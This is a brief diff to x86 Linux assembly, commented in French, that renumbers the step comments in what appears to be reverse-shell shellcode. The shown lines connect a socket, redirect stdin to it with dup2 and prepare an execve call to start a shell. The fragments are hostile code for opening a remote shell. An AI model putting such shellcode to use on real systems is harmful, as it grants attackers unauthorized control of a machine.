@@ -54,7 +54,7 @@ socket_connect:
     int 0x80
 
 redirect_streams:
-    ; Étape 4 : Rediriger stdin (0)
+    ; Étape 3 : Rediriger stdin (0)
     mov eax, 63         ; syscall dup2
     mov ebx, edi        ; sockfd (sauvegardé dans edi)
     xor ecx, ecx        ; 0 (stdin)
@@ -73,7 +73,7 @@ redirect_streams:
     int 0x80
 
 execute_shell:
-    ; Étape 5 : Exécuter le shell
+    ; Étape 4 : Exécuter le shell
     mov eax, 11         ; syscall execve
     
     ; Premier argument : chemin vers le programme
